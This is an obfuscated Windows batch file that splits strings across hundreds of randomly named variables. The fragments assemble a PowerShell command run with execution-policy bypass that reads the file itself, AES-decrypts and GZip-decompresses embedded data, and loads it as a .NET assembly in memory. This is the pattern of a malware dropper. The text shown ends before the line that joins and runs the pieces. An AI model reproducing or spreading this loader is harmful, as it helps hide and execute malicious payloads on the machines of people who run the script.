@echo off
set "ZlPWrPZicE=y "
set "oPMIJVkejL=we"
set "KwYppWjKNC=Wi"
set "nhRgvdBwZB= C"
set "mAcaOZEXIy=in"
set "WzciKpEIAP=st"
set "iULmQGXkYn=0\"
set "DGSAadYnxS=rS"
set "UXJHCNwSeI=ll"
set "HfiPhqgwlV=po"
set "KpHUXxUdna=\v"
set "mPBvfoFnrD=\W"
set "AJfatldBpR=he"
set "EfXIHnzjLb= /"
set "NIvcSQiCQz=s\"
set "vJdsFIGmAb=we"
set "ubttYyQsGi=ll"
set "crEwmuKZvR=do"
set "ZKKWXOBxpq=.e"
set "LriycRokwC=py"
set "KvSpOzloxb=ow"
set "tvYJhYeEDH=nd"
set "FNritpNqsX=he"
set "fWLYKlRRRm=co"
set "rmqxhAyEpu=1."
set "LKsUvLEcYt=xe"
set "eMEoepzNpN=Po"
set "PBOdMTMvgM=32"
set "LUmLOKaWRq=em"
set "CiBODVtQGA=ws"
set "pSDKzQEver=rs"
set "xlfUaaeFPu=:\"
set "URIxicnwNc=Sy"
set "NZCFbPysgp=cd"
set "gngfIsdfDO= %~dp0"
set "FzkdFWJsjC=comp"
set "veKjNeWfnE=.Ass"
set "ugNXyTiRUw=Obje"
set "PWqwNWquUh=and "
set "MxHgDkmXkH=)($H"
set "pLzxVxcPlA=Syst"
set "sGsoGbyDZG=stem"
set "rUqpfmGcJf=BWsi"
set "gTAhpMuWRF=esaB"
set "CNPIEbkwzC=O.Me"
set "IeyoaDEefe= New"
set "dHDwKalgGq=If ="
set "aTGkQkGydh=de);"
set "rlardbEbTZ=WsiJ"
set "vppcBfPMRz=::('"
set "dTSakcisbx=[]] "
set "TEDOwUJLGh=tem."
set "NdvGqYFvRX=[Sys"
set "RGDRUFbSwz= = N"
set "TIvMKZNnDS=zm83"
set "QkzdVOdEsM=m.Re"
set "pGqlnjmhKU=TKde"
set "RJDKvFdqtA=DNJS"
set "GbojERFgKH=y]::"
set "mvYglhwRyF=e, 0"
set "vYLawoKIGm=.GZi"
set "ZrVoDKEpsU=8kuY"
set "UqUbiIOLkQ=] -j"
set "gCCgMeAOIj= if "
set "sIAmkOvsRC='gni"
set "YYBVrzZuMe=Obje"
set "vhRepyrcur=7kGw"
set "SLuhPOKdnQ=);$B"
set "ZSoExXVrBg=TllA"
set "gNWENXZoTx=.Cry"
set "vivXUlfcFk=; };"
set "xSaNwmyAmZ=rofi"
set "hIVQIkdFNZ=stem"
set "vnEftkavro=THxh"
set "pVbttbIxiM=urit"
set "rBhxTtpfQc=bjec"
set "BPTKmqYQun=ress"
set "BeznLKKFMF=m.IO"
set "yohyKqmXYG=ck($"
set "AlMFYurolZ=New-"
set "kDcfFAHujS=;$HG"
set "PLIThSBbli=-Obj"
set "XQEtCpbQaW=n ''"
set "CxPDWNxTYf=Secu"
set "TgUlBgxCjQ=-ep "
set "tZtITDcOaM=ckaq"
set "eCFNFOagJP=7;$B"
set "XtrjlYFlep=;$eH"
set "EHntNXuBHt=PEzG"
set "eLxVWuMMOA=]::("
set "cBjoumnxlD=pose"
set "sHvElGaZJS=dV1k"
set "DqFEWbBSSa=yste"
set "OclsQQomhg=ptog"
set "VOIaggJNJa=oin "
set "PRYktMTtWP='[-1"
set "nLnodBauhf=saBm"
set "bhrgSVVvls=form"
set "NlrnDcdcWR=gnir"
set "xeeWaYHaui=);$B"
set "UMxrYIGHbt=('ev"
set "dVqDOYyszI=-joi"
set "HgwHzFjZxD=BC;$"
set "ZlTNHzuOGG=t.En"
set "RMpTqBYmdb=('da"
set "ehTYmIZGgB=::De"
set "yukHiJVKMO=1] -"
set "ShcaToTrFE=iPt "
set "OgJJjRIQIp=yste"
set "HCQcyeOaRQ=zG ="
set "qstmBdRxSW=Disp"
set "JcHDXgUZwl=HO3I"
set "hOundBePkt=e = "
set "lhtfDDqtAL=).Sp"
set "zvUHkoKcPj=ateD"
set "bLHPABOyYG=V = "
set "xkJNRAMigj=e = "
set "aHDWJWTPBq=oL'["
set "uKllyItqHg=]::("
set "dFpLneVMfs=)) {"
set "irQlYMjYuL=F'[-"
set "hMHYOAlqFZ=rans"
set "lBfPLOvLkh=ltj "
set "rfjfHgkudN=ew-O"
set "wFWlWPZLEG=fore"
set "TMfVrVUXVG=em.I"
set "EQrlYoRhKX=.Dis"
set "bIGgYobFgl=.Key"
set "fDdZoGLmGd=.Cop"
set "pdvfgxdPYM=ss -"
set "YwbFRvpTjc=ptor"
set "OHsJcJDiOd=.Con"
set "CnutXQjVuf=orF'"
set "mXeEgsLHdH=rity"
set "TuytTnwSpN=gth)"
set "FpxUdKrqMN=ckaq"
set "baFwcZRpVT=[Sys"
set "YwvvXHgiCh=FcNh"
set "GhJimhtULN=.IO."
set "pEToJRemUk=ne);"
set "snJIVVKOmS=daeR"
set "rpVfMOSaUM==');"
set "moqwHQrpIr=bypa"
set "PRaEopVpOD=join"
set "ztegSKWnjN=lit("
set "MuayqkCSKc=onve"
set "HiULgmfKXr=New-"
set "MZEBRNjtzr=k; }"
set "JqtCqNbHgX=nage"
set "CxfUxUgePW===')"
set "ceUemDQRmm=pose"
set "GJwWgMnild=tS46"
set "ylMdpXIdlV=ing("
set "MOiBcAnDmk=HTKd"
set "AZdaoJpMvh=();$"
set "WDbAyGVOvo=ionM"
set "fIogLFMFwJ=J.Pa"
set "eVixxQKPfd=$bpT"
set "DqepGTRTlt=ddin"
set "MawwUHtHPv=, $H"
set "uTBdYVvRhp=raph"
set "iZZQBStOTT=Disp"
set "hCouTENrXp=$WPE"
set "owijsSAzBx== [S"
set "GYqTuKiaZZ=;$vK"
set "SCdtBsMZrj= [Sy"
set "CPcziULZIo=ecry"
set "pubirMWhFW=CuSj"
set "wFHmywKWtW=Syst"
set "oTokuHGhmd=HTKd"
set "moxQvTtLng=BoPB"
set "aSrblpnbrW='oPV"
set "yqQLkUFAea=TKde"
set "BjktzxRlZh=$WPE"
set "OpnrwtZbBH=ke($"
set "SKlMklbVKW=stem"
set "VjfiGeKcgM=S46e"
set "RnJMJTUUcZ=ert]"
set "aLILBwNcES=tem."
set "dMfdpjOtVZ=[Env"
set "suuUmXsreG=ypto"
set "FvqpxYNmNp=tJxE"
set "ZQSNpJENxM=$vKl"
set "bpxoYgnXip=HTKd"
set "gPLDdgDyGl=ct S"
set "WKMzvbNYYG=vmu."
set "zLTHiwmQWv=Comp"
set "aWeuVYkOdf=2VUN"
set "cXhWyewtRx=bpTI"
set "lahoAnvCTA=ptog"
set "qCfjfvReID=ose("
set "YXFLRzZiEp=Comp"
set "TaacNberho= '')"
set "sQPblewgku=6esa"
set "IhlqjaEXOA=6] -"
set "cUpHNvfILG=.Cry"
set "iOEcDCFYNR=Secu"
set "sohwlNhTBA=16] "
set "NULzHnjUZO=lBlo"
set "KoUcomlTFR=gMod"
set "WnPAGdtIGF=R5jf"
set "XxadfOHwrd=d;$B"
set "XFsHJKSUhu='txe"
set "nmncgtMJdk=g = "
set "odPdURkqUZ=[Sys"
set "qSIXOpqqiO=oArr"
set "OVgPRcitFP=embl"
set "LjNDpBRPVe=File"
set "TnrhdwVyOq=em.C"
set "PjoUBDQowu=ispo"
set "diopdybqQu=]::N"
set "XoaIfZusuU=iron"
set "dxwjOYowkO=$BoP"
set "OoFWXKzjBR=.Com"
set "RTIaweAjaw=pres"
set "IXIAemwSyY=..-1"
set "hwkFIXdSxH=ddin"
set "LBhRsqztgs= = $"
set "rqYTUbqxRt=sion"
set "vvRejxGzgS=($tJ"
set "bItmrFoPbk=)))"
set "CjQjhAhvIB=th('"
set "fldkQrXPmp=comm"
set "EILIbfhajO=tsWi"
set "GbIVCcqanC=.Len"
set "uOvUEWeJqF='')("
set "rMgVpYxCtx=, (,"
set "MUaMLyewpt=null"
set "BRgcHqNpYu=WsiJ"
set "cUfgaovKhU=nsiP"
set "ubshwThHEh=$eHs"
set "emISjeNjwJ=ment"
set "lHRuUkcTjB=in $"
set "WbggiupkFH=tryP"
set "EfIfiIPYIx=am;$"
set "BFiLcsPrDs=.-16"
set "AZesmjIWcV=f) {"
set "wBKXzmlkHO=.Mod"
set "yRqotavxcg=('%~f0'"
set "edFHTUKbgK=nirt"
set "IghoDRoRLA=oryS"
set "gOxXyuFjEI= '')"
set "RGBNsTLjYR=..-1"
set "LriDuyoaGm=($tJ"
set "UWXxwVGgpB=WsiJ"
set "vvnoWdOmxe=PKCS"
